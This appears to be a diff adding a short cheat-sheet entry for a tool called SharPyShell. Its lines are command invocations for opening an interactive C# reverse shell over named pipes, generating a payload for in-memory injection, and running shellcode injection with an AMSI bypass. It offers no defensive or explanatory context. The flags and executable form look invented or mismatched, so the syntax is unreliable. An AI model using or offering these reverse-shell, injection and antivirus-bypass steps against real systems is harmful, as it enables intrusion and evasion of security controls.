@@ -1,0 +1,16 @@
+# ================= SharPyShell =================
+# Launch an interactive C# reverse shell using named pipes
+SharPyShell.exe --pipe-name mypipe --payload "reverse shell"
+
+# Generate payload to be injected into memory
+SharPyShell.exe --generate-payload --output payload.bin
+
+# Execute a command via shellcode injection using AMSI bypass
+SharPyShell.exe --shellcode payload.bin --bypass-amsi
+
+# Use specific named pipe for communication
+SharPyShell.exe --pipe-name mycustompipe
+
+# Enable verbose debug output
+SharPyShell.exe --verbose
+
